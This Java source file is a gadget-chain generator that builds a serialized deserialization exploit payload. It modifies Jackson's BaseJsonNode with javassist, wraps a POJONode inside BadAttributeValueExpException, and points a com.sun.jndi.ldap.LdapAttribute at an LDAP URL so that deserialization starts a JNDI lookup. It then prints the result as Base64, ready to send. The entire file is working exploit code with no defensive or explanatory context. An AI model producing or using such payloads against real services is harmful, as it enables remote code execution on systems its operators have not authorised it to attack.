package org.y4sec.gadget;

import com.fasterxml.jackson.databind.node.POJONode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import javax.management.BadAttributeValueExpException;
import javax.naming.CompositeName;
import javax.naming.directory.BasicAttribute;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;

@SuppressWarnings("all")
public class JacksonLdapAttrPayload {
    public static void setFieldValue(Object obj,String fieldName,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception {
        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();

        POJONode node = new POJONode(getGadgetObj());
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, node);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
        oos.writeObject(val);
        System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));
    }
    public static BasicAttribute getGadgetObj(){
        try{
            Class clazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
            Constructor clazz_cons = clazz.getDeclaredConstructor(new Class[]{String.class});
            clazz_cons.setAccessible(true);
            BasicAttribute la = (BasicAttribute)clazz_cons.newInstance(new Object[]{"exp"});
            Field bcu_fi = clazz.getDeclaredField("baseCtxURL");
            bcu_fi.setAccessible(true);
            bcu_fi.set(la, "ldap://127.0.0.1:1389/");
            CompositeName cn = new CompositeName();
            cn.add("a");
            cn.add("b");
            Field rdn_fi = clazz.getDeclaredField("rdn");
            rdn_fi.setAccessible(true);
            rdn_fi.set(la, cn);
            return la;
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
